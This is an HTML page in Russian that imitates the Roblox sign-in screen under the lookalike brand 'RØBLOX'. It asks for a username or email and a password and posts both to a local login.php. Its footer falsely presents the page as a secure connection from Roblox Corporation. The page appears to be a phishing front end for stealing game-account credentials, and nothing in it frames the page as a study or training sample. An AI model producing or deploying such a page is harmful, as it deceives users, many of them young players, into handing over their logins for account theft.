<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RØBLOX — Вход</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',Arial,sans-serif;background:#1a1a2e;display:flex;justify-content:center;align-items:center;min-height:100vh;background:linear-gradient(145deg,#0f0f1f,#1a1a2e)}
        .container{background:#2a2a44;padding:40px 35px;border-radius:24px;box-shadow:0 20px 60px rgba(0,0,0,.8);width:400px;text-align:center;border:1px solid #3a3a5a}
        .logo{font-size:48px;font-weight:900;color:#fff;letter-spacing:2px;margin-bottom:4px;text-shadow:0 0 30px rgba(0,162,255,.3)}
        .logo span{color:#00a2ff}
        .subtitle{color:#aaa;font-size:14px;margin-bottom:24px;letter-spacing:1px}
        .input-group{margin-bottom:16px;text-align:left}
        .input-group label{color:#ccc;font-size:13px;font-weight:600;display:block;margin-bottom:4px}
        .input-group input{width:100%;padding:12px 14px;border-radius:10px;border:none;background:#1e1e32;color:#fff;font-size:15px;outline:1px solid #3a3a5a;transition:.2s}
        .input-group input:focus{outline:2px solid #00a2ff;background:#252540}
        .btn{width:100%;padding:14px;margin-top:8px;background:#00a2ff;border:none;border-radius:10px;color:#fff;font-size:17px;font-weight:700;cursor:pointer;transition:.2s;box-shadow:0 4px 20px rgba(0,162,255,.3)}
        .btn:hover{background:#0088dd;transform:scale(1.02)}
        .links{margin-top:16px;font-size:13px;color:#888}
        .links a{color:#00a2ff;text-decoration:none;margin:0 6px}
        .links a:hover{text-decoration:underline}
        .note{margin-top:18px;font-size:11px;color:#555;border-top:1px solid #2a2a44;padding-top:14px}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">RØBLOX</div>
        <div class="subtitle">ВХОД В АККАУНТ</div>

        <form method="POST" action="login.php">
            <div class="input-group">
                <label>Имя пользователя или email</label>
                <input type="text" name="username" placeholder="Введите логин" required>
            </div>
            <div class="input-group">
                <label>Пароль</label>
                <input type="password" name="password" placeholder="Введите пароль" required>
            </div>
            <button type="submit" class="btn">Войти</button>
        </form>

        <div class="links">
            <a href="#">Забыли пароль?</a> ·
            <a href="#">Регистрация</a>
        </div>
        <div class="note">Защищённое соединение • Roblox Corporation</div>
    </div>
</body>
</html>
